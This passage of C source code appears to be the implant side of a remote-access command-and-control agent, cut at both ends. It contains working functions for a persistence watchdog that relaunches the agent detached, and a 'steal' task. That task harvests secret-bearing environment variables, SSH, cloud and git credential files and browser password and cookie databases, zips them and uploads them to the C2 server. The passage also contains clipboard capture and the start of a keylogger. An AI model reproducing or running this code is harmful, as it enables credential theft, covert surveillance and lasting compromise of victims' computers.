            if (total + len < out_size) { memcpy(output + total, buf, len); total += len; }
        }
        pclose(fp);
        output[total] = '\0';
        *exit_code = 0;
    }
#else
    {
        char cmd[] = "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null || echo 'error: no clipboard tool available'";
        FILE *fp = popen(cmd, "r");
        if (!fp) {
            snprintf(output, out_size, "clipboard read failed");
            *exit_code = 1;
            return;
        }
        size_t total = 0;
        char buf[1024];
        while (fgets(buf, sizeof(buf), fp) && total + sizeof(buf) < out_size) {
            size_t len = strlen(buf);
            if (total + len < out_size) { memcpy(output + total, buf, len); total += len; }
        }
        pclose(fp);
        output[total] = '\0';
        if (strncmp(output, "error:", 6) == 0) *exit_code = 1;
        else *exit_code = 0;
    }
#endif
}

/* ---------------------------------------------------------------- clone */

/* clone — cross-agent resurrection watchdog. Watchers are stored in a flat
 * table and checked synchronously from the main loop (no threads needed);
 * each watcher performs its GET /api/clone/status/{target} when enough time
 * has elapsed since its last check (next_check). Matches agent.py semantics:
 * action start|stop|status, target defaults to own id, interval default 30s
 * clamped to [5, 3600]. */

#define CLONE_MAX_WATCHERS     16
#define CLONE_INTERVAL_DEFAULT 30
#define CLONE_INTERVAL_MIN      5
#define CLONE_INTERVAL_MAX   3600

struct clone_watcher {
    char    target[128];
    char    command[1024];
    int     interval;
    int     active;
    int     relaunches;
    time_t  next_check;
    char    status[64];
    char    last_check[64];
};

static struct clone_watcher g_clones[CLONE_MAX_WATCHERS];

static void fmt_time_str(time_t t, char *buf, size_t n) {
    struct tm *tmv = gmtime(&t);
    if (!tmv) {
        snprintf(buf, n, "?");
        return;
    }
    strftime(buf, n, "%Y-%m-%d %H:%M:%S", tmv);
}

/* Launch a process fully detached from the agent (no console, no parent
 * wait): Win32 uses CreateProcess with DETACHED_PROCESS; POSIX forks into a
 * new session leader so the orphaned child keeps running the relaunch. */
static int relaunch_detached(const char *command) {
#ifdef _WIN32
    const char *comspec = getenv("COMSPEC");
    if (!comspec || !comspec[0]) comspec = "cmd.exe";
    char cmdline[4608];
    snprintf(cmdline, sizeof(cmdline), "%s /C %s", comspec, command);
    STARTUPINFOA si;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                        DETACHED_PROCESS | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi))
        return -1;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
#else
    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        /* detach from the controlling terminal, /dev/null stdio */
        freopen("/dev/null", "r", stdin);
        freopen("/dev/null", "w", stdout);
        freopen("/dev/null", "w", stderr);
#ifdef __APPLE__
        setpgid(0, 0); /* macOS has no setsid() */
#else
        setsid();      /* start_new_session like agent.py */
#endif
        execl("/bin/sh", "sh", "-c", command, (char *)NULL);
        _exit(127);
    }
    return 0; /* do not wait; the orphan continues in the background */
#endif
}

static struct clone_watcher *clone_find(const char *target) {
    for (int i = 0; i < CLONE_MAX_WATCHERS; i++) {
        if (g_clones[i].active && strcmp(g_clones[i].target, target) == 0)
            return &g_clones[i];
    }
    return NULL;
}

static int clone_add(const char *target, const char *command, int interval) {
    for (int i = 0; i < CLONE_MAX_WATCHERS; i++) {
        if (!g_clones[i].active) {
            struct clone_watcher *w = &g_clones[i];
            memset(w, 0, sizeof(*w));
            strncpy(w->target, target, sizeof(w->target) - 1);
            strncpy(w->command, command, sizeof(w->command) - 1);
            w->interval = interval;
            w->active = 1;
            w->relaunches = 0;
            w->next_check = 0; /* checked on the next main-loop pass */
            snprintf(w->status, sizeof(w->status), "starting");
            snprintf(w->last_check, sizeof(w->last_check), "never");
            return 0;
        }
    }
    return -1;
}

/* One watcher round: perform the status request if its interval elapsed. */
static void clone_watch_check(struct clone_watcher *w) {
    time_t now = time(NULL);
    if (now < w->next_check) return;

    char path[1024];

    snprintf(path, sizeof(path), "/api/clone/status/%s", w->target);
    char resp[4096] = "";
    int code = get_url_to_buf(path, resp, sizeof(resp));
    char nows[64];
    fmt_time_str(now, nows, sizeof(nows));

    if (code == 404) {
        snprintf(w->status, sizeof(w->status), "unknown");
        snprintf(w->last_check, sizeof(w->last_check), "target gone");
    } else if (code == 200) {
        char st[64] = "unknown";
        json_find_string(resp, "status", st, sizeof(st));
        snprintf(w->status, sizeof(w->status), "%s", st);
        snprintf(w->last_check, sizeof(w->last_check), "%s", nows);
        if ((strcmp(st, "dead") == 0 || strcmp(st, "stale") == 0) && w->command[0]) {
            logmsg("clone: target %s %s -> relaunching", w->target, st);
            w->relaunches++;
            if (relaunch_detached(w->command) != 0)
                logmsg("clone: relaunch failed: could not start process");
        }
    } else {
        snprintf(w->status, sizeof(w->status), "http %d", code);
        snprintf(w->last_check, sizeof(w->last_check), "%s", nows);
    }
    w->next_check = now + w->interval;
}

/* Run one check round for every active watcher; called from the main loop. */
static void check_clone_watchers(void) {
    for (int i = 0; i < CLONE_MAX_WATCHERS; i++) {
        if (g_clones[i].active)
            clone_watch_check(&g_clones[i]);
    }
}

static int cmp_str(const void *a, const void *b) {
    return strcmp(*(const char *const *)a, *(const char *const *)b);
}

static void task_clone(const char *args_json, char *output, size_t out_size, int *exit_code) {
    char action[32] = "start";
    char target[128] = "";
    char command[1024] = "";
    int interval = CLONE_INTERVAL_DEFAULT;

    json_find_string(args_json, "action", action, sizeof(action));
    json_find_string(args_json, "target", target, sizeof(target));
    json_find_string(args_json, "command", command, sizeof(command));
    char istr[32] = "";
    if (json_find_string(args_json, "interval", istr, sizeof(istr)) == 0) {
        int v = atoi(istr);
        if (v > 0) interval = v;
    }
    if (interval < CLONE_INTERVAL_MIN) interval = CLONE_INTERVAL_MIN;
    if (interval > CLONE_INTERVAL_MAX) interval = CLONE_INTERVAL_MAX;

    for (char *c = action; *c; c++) /* strip().lower() like agent.py */
        if (*c >= 'A' && *c <= 'Z') *c += 32;

    if (!target[0]) snprintf(target, sizeof(target), "%s", g_agent_id);

    if (strcmp(action, "stop") == 0) {
        struct clone_watcher *w = clone_find(target);
        if (!w) {
            snprintf(output, out_size, "clone: no watcher for %s", target);
            *exit_code = 1;
            return;
        }
        w->active = 0;
        snprintf(output, out_size, "clone: watcher for %s stopped", target);
        *exit_code = 0;
        return;
    }

    if (strcmp(action, "status") == 0) {
        int count = 0;
        const char *lines[CLONE_MAX_WATCHERS];
        for (int i = 0; i < CLONE_MAX_WATCHERS; i++) {
            if (!g_clones[i].active) continue;
            static char linebuf[CLONE_MAX_WATCHERS][1400];
            snprintf(linebuf[i], sizeof(linebuf[i]),
                "  %s: %s | last_check %s | relaunched %dx | cmd: %s",
                g_clones[i].target, g_clones[i].status, g_clones[i].last_check,
                g_clones[i].relaunches,
                g_clones[i].command[0] ? g_clones[i].command : "(none)");
            lines[count++] = linebuf[i];
        }
        if (count == 0) {
            snprintf(output, out_size, "clone: no watchers running");
            *exit_code = 0;
            return;
        }
        qsort(lines, (size_t)count, sizeof(char *), cmp_str);
        snprintf(output, out_size, "clone watchers:");
        size_t used = strlen(output);
        for (int i = 0; i < count && used < out_size; i++) {
            int n = snprintf(output + used, out_size - used, "\n%s", lines[i]);
            if (n < 0) break;
            used += (size_t)n;
        }
        if (used < out_size) output[used] = '\0';
        *exit_code = 0;
        return;
    }

    /* start */
    if (clone_find(target)) {
        snprintf(output, out_size, "clone: watcher for %s already running", target);
        *exit_code = 1;
        return;
    }
    if (!command[0]) {
        snprintf(output, out_size, "clone: 'command' (relaunch cmd) required");
        *exit_code = 1;
        return;
    }
    if (clone_add(target, command, interval) != 0) {
        snprintf(output, out_size, "clone: watcher table full (%d max)", CLONE_MAX_WATCHERS);
        *exit_code = 1;
        return;
    }
    snprintf(output, out_size,
        "clone: watcher started on target %s (every %ds, restart cmd: %s)",
        target, interval, command);
    *exit_code = 0;
}

/* ---------------------------------------------------------------- steal */

/* steal — collect credentials-ish material (env, token files, raw browser
 * DBs), zip it and upload via /api/files/{task_id}. Mirrors agent.py
 * phase-1 scope: no decryption happens on the agent side. */

#define STEAL_MAX_FILE    (8 * 1024 * 1024)  /* per-file copy cap (8 MB) */
#define STEAL_MAX_ITEMS   512

static const char *steal_keywords[] = {
    "token", "secret", "password", "passwd", "key=", "api", "auth",
    "aws", "azure", "google", "github", "gitlab", "slack", "discord",
    "cookie", "session", "credential", "access", "proxy", "login",
    NULL
};

static const char *steal_token_files[] = {
    ".aws/credentials", ".aws/config",
    ".git-credentials", ".netrc", ".npmrc", ".pypirc",
    ".pip/pip.conf", ".config/pip/pip.conf",
    ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
    ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
    ".docker/config.json", ".kube/config",
    ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
    ".ssh/known_hosts", ".ssh/authorized_keys",
    NULL
};

static const char *steal_chromium_files[] = { "Login Data", "Cookies", "Web Data", NULL };
static const char *steal_firefox_files[]  = { "cookies.sqlite", "logins.json", "key4.db", "cert9.db", NULL };

struct steal_ctx {
    char *manifest[STEAL_MAX_ITEMS];
    int   n_items;
    int   env_hit, tokens_hit, browser_hit;
};

struct strbuf {
    char  *data;
    size_t len;
    size_t cap;
};

static void sb_add(struct strbuf *sb, const char *s) {
    size_t sl = strlen(s);
    if (sb->len + sl + 1 > sb->cap) {
        size_t ncap = sb->cap ? sb->cap * 2 : 256;
        while (ncap < sb->len + sl + 1) ncap *= 2;
        sb->data = realloc(sb->data, ncap);
        if (!sb->data) { sb->len = 0; sb->cap = 0; return; }
        sb->cap = ncap;
    }
    memcpy(sb->data + sb->len, s, sl);
    sb->len += sl;
    sb->data[sb->len] = '\0';
}

static void sb_addf(struct strbuf *sb, const char *fmt, ...) {
    va_list args;
    char tmp[4096];
    va_start(args, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    sb_add(sb, tmp);
}

static int steal_add_item(struct steal_ctx *ctx, const char *line) {
    if (ctx->n_items >= STEAL_MAX_ITEMS) return -1;
    ctx->manifest[ctx->n_items] = strdup(line);
    if (ctx->manifest[ctx->n_items]) { ctx->n_items++; return 0; }
    return -1;
}

static int copy_file(const char *src, const char *dst) {
    FILE *in = fopen(src, "rb");
    if (!in) return -1;
    FILE *out = fopen(dst, "wb");
    if (!out) { fclose(in); return -1; }
    char buf[65536];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in);
            fclose(out);
            remove(dst);
            return -1;
        }
    }
    fclose(in);
    fclose(out);
    return 0;
}

/* copy a file with an 8MB cap; returns 1 (and fills dst_path) on success */
static int steal_safe_copy(const char *src, const char *dst_dir, char *dst_path, size_t dst_size) {
    struct stat st;
    if (stat(src, &st) != 0) return 0;
    if ((st.st_mode & S_IFMT) != S_IFREG) return 0;
    if (st.st_size > STEAL_MAX_FILE) return 0;
    mkdirs(dst_dir);
    snprintf(dst_path, dst_size, "%s%c%s", dst_dir, PATH_SEP, path_base(src));
    return copy_file(src, dst_path) == 0;
}

static int make_steal_dir(char *out, size_t n) {
    const char *base = getenv("TEMP");
#ifdef _WIN32
    if (!base || !base[0]) base = ".";
#else
    if (!base || !base[0]) base = "/tmp";
#endif
    for (int attempt = 0; attempt < 64; attempt++) {
        snprintf(out, n, "%s%cc2steal_%ld_%d",
                 base, PATH_SEP, (long)getpid(), rand() % 1000000);
        struct stat st;
        if (stat(out, &st) == 0) continue; /* collision, retry */
#ifdef _WIN32
        if (_mkdir(out) == 0) return 0;
#else
        if (mkdir(out, 0700) == 0) return 0;
#endif
    }
    return -1;
}

static void remove_tree(const char *path) {
#ifdef _WIN32
    char pattern[2048];
    snprintf(pattern, sizeof(pattern), "%s\\*", path);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
            char sub[2048];
            snprintf(sub, sizeof(sub), "%s\\%s", path, fd.cFileName);
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                remove_tree(sub);
            else {
                SetFileAttributesA(sub, FILE_ATTRIBUTE_NORMAL);
                remove(sub);
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    _rmdir(path);
#else
    DIR *d = opendir(path);
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;
            char sub[1024];
            snprintf(sub, sizeof(sub), "%s/%s", path, ent->d_name);
            struct stat st;
            if (stat(sub, &st) == 0 && (st.st_mode & S_IFMT) == S_IFDIR)
                remove_tree(sub);
            else
                remove(sub);
        }
        closedir(d);
    }
    rmdir(path);
#endif
}

/* env profile: dump vars whose lowercased KEY matches a sensitive keyword */
static int steal_keyword_match_lower(const char *lowkey) {
    for (int k = 0; steal_keywords[k]; k++)
        if (strstr(lowkey, steal_keywords[k])) return 1;
    return 0;
}

/* does a "VAR=value" line's key match any sensitive keyword (case-insensitive)? */
static int steal_env_line_matches(const char *line) {
    const char *eq = strchr(line, '=');
    if (!eq || eq == line) return 0;
    size_t klen = (size_t)(eq - line);
    if (klen >= 512) return 0;
    char kbuf[512];
    memcpy(kbuf, line, klen);
    kbuf[klen] = '\0';
    for (char *c = kbuf; *c; c++)
        if (*c >= 'A' && *c <= 'Z') *c += 32;
    return steal_keyword_match_lower(kbuf);
}

static void steal_env(struct steal_ctx *ctx, const char *work) {
    char  *hits[256];
    int    n = 0;
    memset(hits, 0, sizeof(hits));

#ifdef _WIN32
    char *blk = GetEnvironmentStringsA();
    if (!blk) return;
    for (char *p = blk; *p; p += strlen(p) + 1) {
        if (*p == '=') continue;
        if (n >= 256) break;
        if (steal_env_line_matches(p)) hits[n++] = strdup(p);
    }
    FreeEnvironmentStringsA(blk);
#else
    extern char **environ;
    for (char **e = environ; e && *e; e++) {
        if (n >= 256) break;
        if (steal_env_line_matches(*e)) hits[n++] = strdup(*e);
    }
#endif

    if (n == 0) return;
    qsort(hits, (size_t)n, sizeof(char *), cmp_str);
    char path[1024];
    snprintf(path, sizeof(path), "%s%cenv.txt", work, PATH_SEP);
    FILE *fp = fopen(path, "w");
    if (fp) {
        for (int i = 0; i < n; i++)
            fprintf(fp, "%s\n", hits[i]);
        fclose(fp);
        steal_add_item(ctx, "env.txt");
        ctx->env_hit = 1;
    }
    for (int i = 0; i < n; i++) free(hits[i]);
}

/* tokens profile: copy the credential file list under home into tokens/ */
static void steal_tokens(struct steal_ctx *ctx, const char *work) {
    const char *home = getenv(HOME_ENV);
    if (!home || !home[0]) return;
    char tok_dir[1024];
    snprintf(tok_dir, sizeof(tok_dir), "%s%ctokens", work, PATH_SEP);
    for (int i = 0; steal_token_files[i]; i++) {
        char src[1200], dst[1200], line[1200];
        snprintf(src, sizeof(src), "%s%c%s", home, PATH_SEP, steal_token_files[i]);
        if (steal_safe_copy(src, tok_dir, dst, sizeof(dst))) {
            snprintf(line, sizeof(line), "tokens/%s", path_base(steal_token_files[i]));
            steal_add_item(ctx, line);
            ctx->tokens_hit = 1;
        }
    }
}

enum { STEAL_CHROMIUM = 0, STEAL_FIREFOX = 1 };

struct browser_root { char dir[1024]; int kind; };

/* platform-specific browser root dirs (same candidates as agent.py) */
static void browser_roots(struct browser_root *roots, int *n, int max) {
#ifndef _WIN32
    const char *home = getenv(HOME_ENV);
#endif
    int i = 0;
    if (i >= max) { *n = 0; return; }
#ifdef _WIN32
    const char *la = getenv("LOCALAPPDATA");
    const char *appd = getenv("APPDATA");
    static const char *win_cr[] = {
        "Google/Chrome/User Data", "Microsoft/Edge/User Data",
        "BraveSoftware/Brave-Browser/User Data", "Opera Software/Opera Stable"
    };
    if (la && la[0]) {
        for (size_t j = 0; j < sizeof(win_cr) / sizeof(win_cr[0]) && i < max; j++) {
            snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/%s", la, win_cr[j]);
            roots[i].kind = STEAL_CHROMIUM;
            i++;
        }
    }
    if (appd && appd[0] && i < max) {
        snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/Mozilla/Firefox/Profiles", appd);
        roots[i].kind = STEAL_FIREFOX;
        i++;
    }
#elif defined(__APPLE__)
    static const char *mac_cr[] = {
        "Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser"
    };
    if (home && home[0]) {
        char base[1024];
        snprintf(base, sizeof(base), "%s/Library/Application Support", home);
        for (size_t j = 0; j < sizeof(mac_cr) / sizeof(mac_cr[0]) && i < max; j++) {
            snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/%s", base, mac_cr[j]);
            roots[i].kind = STEAL_CHROMIUM;
            i++;
        }
        if (i < max) {
            snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/Firefox/Profiles", base);
            roots[i].kind = STEAL_FIREFOX;
            i++;
        }
    }
#else
    static const char *lnx_cr[] = {
        "google-chrome", "chromium", "microsoft-edge", "msedge",
        "brave-browser", "brave", "opera"
    };
    if (home && home[0]) {
        char base[1024];
        snprintf(base, sizeof(base), "%s/.config", home);
        for (size_t j = 0; j < sizeof(lnx_cr) / sizeof(lnx_cr[0]) && i < max; j++) {
            snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/%s", base, lnx_cr[j]);
            roots[i].kind = STEAL_CHROMIUM;
            i++;
        }
        if (i < max) {
            snprintf(roots[i].dir, sizeof(roots[i].dir), "%s/.mozilla/firefox", home);
            roots[i].kind = STEAL_FIREFOX;
            i++;
        }
    }
#endif
    *n = i;
}

/* "Default/subdir" -> "Default__subdir" (mirrors rel.replace(os.sep,'__')) */
static void rel_to_underscore(const char *rel, char *out, size_t n) {
    size_t j = 0;
    for (const char *p = rel; *p && j + 3 <= n; p++) {
        if (*p == '/' || *p == '\\') {
            out[j++] = '_';
            out[j++] = '_';
        } else {
            out[j++] = *p;
        }
    }
    if (j < n) out[j] = '\0';
    else if (n > 0) out[n - 1] = '\0';
}

/* recursively copy the named DB files under a browser root into browser/ */
static void steal_browser_walk(struct steal_ctx *ctx, const char *work,
                               const char *dir, const char *rel,
                               const char *kind_name, const char **targets) {
#ifdef _WIN32
    char pattern[1024];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        const char *name = fd.cFileName;
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s\\%s", dir, name);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char nrel[1024];
            if (rel[0]) snprintf(nrel, sizeof(nrel), "%s\\%s", rel, name);
            else snprintf(nrel, sizeof(nrel), "%s", name);
            steal_browser_walk(ctx, work, full, nrel, kind_name, targets);
            continue;
        }
        int is_target = 0;
        for (int t = 0; targets[t]; t++)
            if (strcmp(name, targets[t]) == 0) { is_target = 1; break; }
        if (!is_target) continue;
        char relfold[1100], dst_dir[2300], dst[3400], line[2200];
        rel_to_underscore(rel, relfold, sizeof(relfold));
        if (!relfold[0]) snprintf(relfold, sizeof(relfold), "%s", name);
        snprintf(dst_dir, sizeof(dst_dir), "%s%cbrowser%c%s%c%s",
                 work, PATH_SEP, PATH_SEP, kind_name, PATH_SEP, relfold);
        if (steal_safe_copy(full, dst_dir, dst, sizeof(dst))) {
            snprintf(line, sizeof(line), "browser/%s/%s/%s", kind_name, relfold, name);
            steal_add_item(ctx, line);
            ctx->browser_hit = 1;
        }
    } while (FindNextFileA(h, &fd));
    FindClose(h);
#else
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        const char *name = ent->d_name;
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) continue;
        char full[1024];
        snprintf(full, sizeof(full), "%s/%s", dir, name);
        struct stat st;
        if (stat(full, &st) != 0) continue;
        if ((st.st_mode & S_IFMT) == S_IFDIR) {
            char nrel[1024];
            if (rel[0]) snprintf(nrel, sizeof(nrel), "%s/%s", rel, name);
            else snprintf(nrel, sizeof(nrel), "%s", name);
            steal_browser_walk(ctx, work, full, nrel, kind_name, targets);
            continue;
        }
        int is_target = 0;
        for (int t = 0; targets[t]; t++)
            if (strcmp(name, targets[t]) == 0) { is_target = 1; break; }
        if (!is_target) continue;
        char relfold[1100], dst_dir[2300], dst[3400], line[2200];
        rel_to_underscore(rel, relfold, sizeof(relfold));
        if (!relfold[0]) snprintf(relfold, sizeof(relfold), "%s", name);
        snprintf(dst_dir, sizeof(dst_dir), "%s%cbrowser%c%s%c%s",
                 work, PATH_SEP, PATH_SEP, kind_name, PATH_SEP, relfold);
        if (steal_safe_copy(full, dst_dir, dst, sizeof(dst))) {
            snprintf(line, sizeof(line), "browser/%s/%s/%s", kind_name, relfold, name);
            steal_add_item(ctx, line);
            ctx->browser_hit = 1;
        }
    }
    closedir(d);
#endif
}

static void steal_browser(struct steal_ctx *ctx, const char *work) {
    struct browser_root roots[16];
    int nroots = 0;
    browser_roots(roots, &nroots, 16);
    for (int i = 0; i < nroots; i++) {
        struct stat st;
        if (stat(roots[i].dir, &st) != 0 || (st.st_mode & S_IFMT) != S_IFDIR)
            continue;
        const char **targets = (roots[i].kind == STEAL_FIREFOX)
                                   ? steal_firefox_files : steal_chromium_files;
        steal_browser_walk(ctx, work, roots[i].dir, "",
                           (roots[i].kind == STEAL_FIREFOX) ? "firefox" : "chromium",
                           targets);
    }
}

/* zip the collected entries (space-separated, must exist) via system zip,
 * falling back to tar; the result is written as steal.zip inside work. */
static int zip_workdir(const char *work, const char *entries) {
    char cmd[4096];
#ifdef _WIN32
    snprintf(cmd, sizeof(cmd),
        "cd /d \"%s\" && ((zip -qr steal.zip %s >nul 2>nul) || (tar -cf steal.zip %s >nul 2>nul))",
        work, entries, entries);
#else
    snprintf(cmd, sizeof(cmd),
        "cd \"%s\" && (command -v zip >/dev/null 2>&1 && (zip -qr steal.zip %s >/dev/null 2>&1) || (tar -cf steal.zip %s >/dev/null 2>&1))",
        work, entries, entries);
#endif
    system(cmd);
    char archive[1100];
    snprintf(archive, sizeof(archive), "%s%csteal.zip", work, PATH_SEP);
    struct stat st;
    if (stat(archive, &st) != 0 || st.st_size <= 0) return -1;
    return 0;
}

static int upload_steal_zip(const char *archive, const char *task_id) {
    char url[4096];
    snprintf(url, sizeof(url), "%s/api/files/%s", g_server, task_id);

    CURL *curl = curl_easy_init();
    if (!curl) return -1;

    curl_mime *mime = curl_mime_init(curl);
    curl_mimepart *part = curl_mime_addpart(mime);
    curl_mime_name(part, "file");
    curl_mime_filedata(part, archive);
    curl_mime_filename(part, "steal.zip");
    curl_mime_type(part, "application/zip");

    struct curl_slist *headers = NULL;
    char auth_header[1200];
    snprintf(auth_header, sizeof(auth_header), "X-Agent-Token: %s", g_token);
    headers = curl_slist_append(headers, auth_header);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 300L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, tls_no_verify());

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_mime_free(mime);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK && http_code == 200) ? 0 : -1;
}

/* head/tail truncation like agent.py's truncate_output with a custom limit */
static void truncate_to(const char *in, char *out, size_t out_size, size_t limit) {
    size_t len = strlen(in);
    if (len <= limit) {
        strncpy(out, in, out_size - 1);
        out[out_size - 1] = '\0';
        return;
    }
    size_t head = limit / 5;
    size_t tail = limit - head - 40;
    size_t omitted = len - head - tail;
    snprintf(out, out_size, "%.*s\n... [%zu chars truncated] ...\n%.*s",
             (int)head, in, omitted, (int)tail, in + len - tail);
}

static void task_steal(const char *task_id, const char *args_json, char *output, size_t out_size, int *exit_code) {
    char profile[32] = "all";
    json_find_string(args_json, "profile", profile, sizeof(profile));
    if (!profile[0]) strncpy(profile, "all", sizeof(profile) - 1);
    for (char *c = profile; *c; c++)
        if (*c >= 'A' && *c <= 'Z') *c += 32;
    if (strcmp(profile, "all") != 0 && strcmp(profile, "env") != 0 &&
        strcmp(profile, "tokens") != 0 && strcmp(profile, "browser") != 0)
        strncpy(profile, "all", sizeof(profile) - 1);

    char work[1024];
    if (make_steal_dir(work, sizeof(work)) != 0) {
        snprintf(output, out_size, "error: could not create working directory");
        *exit_code = 1;
        return;
    }

    struct steal_ctx ctx;
    memset(&ctx, 0, sizeof(ctx));

    if (strcmp(profile, "all") == 0 || strcmp(profile, "env") == 0) {
        logmsg("steal: collecting env vars");
        steal_env(&ctx, work);
    }
    if (strcmp(profile, "all") == 0 || strcmp(profile, "tokens") == 0) {
        logmsg("steal: collecting token files");
        steal_tokens(&ctx, work);
    }
    if (strcmp(profile, "all") == 0 || strcmp(profile, "browser") == 0) {
        logmsg("steal: collecting browser dbs");
        steal_browser(&ctx, work);
    }

    if (ctx.n_items == 0) {
        remove_tree(work);
        snprintf(output, out_size, "steal (%s): nothing found", profile);
        *exit_code = 1;
        return;
    }

    /* manifest.txt: sorted listing inside the archive (agent.py parity) */
    {
        char *sorted[STEAL_MAX_ITEMS];
        memcpy(sorted, ctx.manifest, sizeof(char *) * (size_t)ctx.n_items);
        qsort(sorted, (size_t)ctx.n_items, sizeof(char *), cmp_str);
        char mpath[1100];
        snprintf(mpath, sizeof(mpath), "%s%cmanifest.txt", work, PATH_SEP);
        FILE *fp = fopen(mpath, "w");
        if (fp) {
            for (int i = 0; i < ctx.n_items; i++)
                fprintf(fp, "%s\n", sorted[i]);
            fclose(fp);
        }
    }

    /* zip only the pieces that actually exist */
    char entries[2048] = "manifest.txt";
    if (ctx.env_hit)     strncat(entries, " env.txt", sizeof(entries) - strlen(entries) - 1);
    if (ctx.tokens_hit)  strncat(entries, " tokens", sizeof(entries) - strlen(entries) - 1);
    if (ctx.browser_hit) strncat(entries, " browser", sizeof(entries) - strlen(entries) - 1);

    /* collect the listing before the archive is uploaded (collection order) */
    struct strbuf sb;
    memset(&sb, 0, sizeof(sb));
    for (int i = 0; i < ctx.n_items; i++) {
        sb_add(&sb, ctx.manifest[i]);
        sb_add(&sb, "\n");
    }

    if (zip_workdir(work, entries) != 0) {
        free(sb.data);
        remove_tree(work);
        snprintf(output, out_size, "steal: zip failed");
        *exit_code = 1;
        return;
    }

    char archive[1100];
    snprintf(archive, sizeof(archive), "%s%csteal.zip", work, PATH_SEP);
    struct stat st;
    if (stat(archive, &st) != 0) {
        free(sb.data);
        remove_tree(work);
        snprintf(output, out_size, "steal: zip failed");
        *exit_code = 1;
        return;
    }

    if (upload_steal_zip(archive, task_id) != 0) {
        free(sb.data);
        remove_tree(work);
        snprintf(output, out_size, "steal upload failed");
        *exit_code = 1;
        return;
    }

    struct strbuf body;
    memset(&body, 0, sizeof(body));
    sb_addf(&body, "stole %d item(s) -> steal.zip (%ld bytes)\n%s",
            ctx.n_items, (long)st.st_size, sb.data ? sb.data : "");
    truncate_to(body.data ? body.data : "", output, out_size, 4000);
    free(body.data);
    free(sb.data);
    remove_tree(work);
    *exit_code = 0;
}

/* keylogger state (moved here from main) */
static char       g_keylog_buf[KEYLOG_LIMIT * 2] = "";
static size_t     g_keylog_len = 0;
static int        g_keylog_running = 0;
#ifndef _WIN32
static pthread_t  g_keylog_thread;
static pthread_mutex_t g_keylog_mutex = PTHREAD_MUTEX_INITIALIZER;
#define KEYLOG_LOCK()   pthread_mutex_lock(&g_keylog_mutex)
#define KEYLOG_UNLOCK() pthread_mutex_unlock(&g_keylog_mutex)
#else
static HANDLE     g_keylog_thread_handle = NULL;
static SRWLOCK    g_keylog_lock = SRWLOCK_INIT;
#define KEYLOG_LOCK()   AcquireSRWLockExclusive(&g_keylog_lock)
#define KEYLOG_UNLOCK() ReleaseSRWLockExclusive(&g_keylog_lock)
#endif

static void keylog_append(const char *s) {
    if (!s || !*s) return;
    size_t len = strlen(s);
    KEYLOG_LOCK();
    while (g_keylog_len + len + 1 >= sizeof(g_keylog_buf)) {
        /* drop oldest half */
        size_t drop = sizeof(g_keylog_buf) / 2;
        memmove(g_keylog_buf, g_keylog_buf + drop, g_keylog_len - drop + 1);
        g_keylog_len -= drop;
    }
    memcpy(g_keylog_buf + g_keylog_len, s, len + 1);
    g_keylog_len += len;
    KEYLOG_UNLOCK();
}

#ifdef _WIN32
static DWORD WINAPI keylog_worker(LPVOID arg) {
    (void)arg;
    static const char *vkmap[256] = {0};
    vkmap[VK_SPACE]  = " ";  vkmap[VK_RETURN] = "[ENTER]\n";
    vkmap[VK_TAB]    = "[TAB]"; vkmap[VK_BACK] = "[BACKSPACE]";
    vkmap[VK_ESCAPE] = "[ESC]"; vkmap[VK_DELETE]= "[DEL]";
    vkmap[VK_LSHIFT] = "[LSHIFT]"; vkmap[VK_RSHIFT] = "[RSHIFT]";
    vkmap[VK_LCONTROL] = "[LCTRL]"; vkmap[VK_RCONTROL] = "[RCTRL]";
    vkmap[VK_LMENU]  = "[LALT]"; vkmap[VK_RMENU] = "[RALT]";
    for (int i = 8 ; i <= 190; i++) {
        if (i >= 'A' && i <= 'Z') continue;
        if (i >= '0' && i <= '9') continue;
